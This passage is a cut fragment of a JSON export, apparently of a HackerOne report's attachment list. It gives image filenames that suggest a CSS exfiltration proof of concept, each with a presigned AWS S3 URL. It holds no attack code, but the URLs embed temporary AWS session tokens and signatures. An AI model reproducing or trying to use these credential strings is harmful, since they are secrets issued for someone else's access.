NiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25151e2930fe41d1f03fb38442b18bd6d1db4c1b60f76f2d4e031d16cdf3af47"
                },
                {
                    "id": 861253,
                    "filename": "multipletemplates.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j5TvsXr4E54WvwaqfGkw5EGV?response-content-disposition=attachment%3B%20filename%3D%22multipletemplates.jpg%22%3B%20filename%2A%3DUTF-8%27%27multipletemplates.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0c8afc064051b79e4c2288405426af4e471a0c4da4eb8adb4472f18d051cb825"
                },
                {
                    "id": 861252,
                    "filename": "explanation.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NzwFF9J3DhzXBLnXqYw9BmNF?response-content-disposition=attachment%3B%20filename%3D%22explanation.png%22%3B%20filename%2A%3DUTF-8%27%27explanation.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e386e130fa6cb3936e7b2a414eb365c185891ea4ec122b01429c1c99cf096c0a"
                },
                {
                    "id": 861251,
                    "filename": "dashboard.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rKDrQFcfA4awQHM14hJYPHUD?response-content-disposition=attachment%3B%20filename%3D%22dashboard.jpg%22%3B%20filename%2A%3DUTF-8%27%27dashboard.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a9702411fb65a27bf7fec7e1c80f10348f1647083d2e2008120ef1ba9c9519d5"
                },
                {
                    "id": 861250,
                    "filename": "congrats.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LVB4cnuThn6vrk6DZeG7bbz5?response-content-disposition=attachment%3B%20filename%3D%22congrats.jpg%22%3B%20filename%2A%3DUTF-8%27%27congrats.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c47f7c48f910822d5e3ae1ff9818f71be538e3279b74a64d8430ef0f60bd5782"
                },
                {
                    "id": 861249,
                    "filename": "collaboratorpoc.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9nnvjBE2Dc9xKqJMpVeXt6F5?response-content-disposition=attachment%3B%20filename%3D%22collaboratorpoc.jpg%22%3B%20filename%2A%3DUTF-8%27%27collaboratorpoc.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ccc8a9de72dfa34afcb33c31fd1262af639d75ec4768bd87024274e0adc3ac9"
                },
                {
                    "id": 861248,
                    "filename": "collaboratorcssfire1_6.JPG",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3arRhJojJnE7w7R37ariBBBY?response-content-disposition=attachment%3B%20filename%3D%22collaboratorcssfire1_6.JPG%22%3B%20filename%2A%3DUTF-8%27%27collaboratorcssfire1_6.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1843fc3612ec95f5ae7377e346b1631709bf9b3d5b451d2988b446204cb788a6"
                },
                {
                    "id": 861247,
                    "filename": "collaboratorcssfirefirstchar.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LcD8qvUDnaisHNATMn7HXGc6?response-content-disposition=attachment%3B%20filename%3D%22collaboratorcssfirefirstchar.jpg%22%3B%20filename%2A%3DUTF-8%27%27collaboratorcssfirefirstchar.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1dc9a7d4e5528938a92e6cea9c9896b02f91320daae9d0ce246b7747217968d7"
                },
                {
                    "id": 861246,
                    "filename": "collaboratorcssfire1.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SR2Kke9PC6ojes5EHY7AW59C?response-content-disposition=attachment%3B%20filename%3D%22collaboratorcssfire1.jpg%22%3B%20filename%2A%3DUTF-8%27%27collaboratorcssfire1.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLt